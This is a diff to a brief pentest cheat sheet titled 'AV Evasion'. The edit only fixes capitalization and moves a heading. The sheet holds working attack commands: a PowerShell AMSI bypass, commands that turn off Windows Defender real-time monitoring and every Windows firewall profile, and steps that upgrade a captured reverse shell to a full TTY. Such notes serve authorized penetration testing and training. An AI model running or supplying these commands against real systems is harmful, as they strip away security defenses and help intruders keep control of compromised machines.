@@ -1,15 +1,15 @@
 # AV Evasion
-
-# Stablize Shell
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-# Disable real-time protection on windows.
+# Disable real-time protection on Windows.
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
+
+# Stablize Shell
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 
@@ -17,7 +17,7 @@ ctrl+z
 
 stty raw -echo;fg
 ```
-# Turn Firewall off on windows:
+# Turn Firewall off on Windows:
 ```bash
 netsh advfirewall set allprofiles state off
 ```
